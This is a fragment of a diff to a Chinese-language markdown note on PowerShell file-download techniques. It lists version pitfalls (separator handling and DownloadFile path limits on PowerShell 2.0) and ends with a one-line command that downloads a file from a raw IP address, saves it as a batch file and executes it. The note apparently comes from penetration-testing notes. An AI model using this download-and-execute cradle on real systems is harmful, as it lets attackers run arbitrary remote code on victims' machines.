@@ -13,7 +13,7 @@ win2003，winXP不支持
 
 踩坑：
 
-- Powershell 版本大于2.0时 在连接Powershell命令时 **空格** 替换了 `;`
+- Powershell 版本大于2.0时 在连接Powershell命令时 **空格** 替换了 ;
 - Powershell 版本低于或等于2.0时 `DownloadFile()`函数不支持自定义路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)
 
 powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', 'test.bat');start-process 'test.bat'
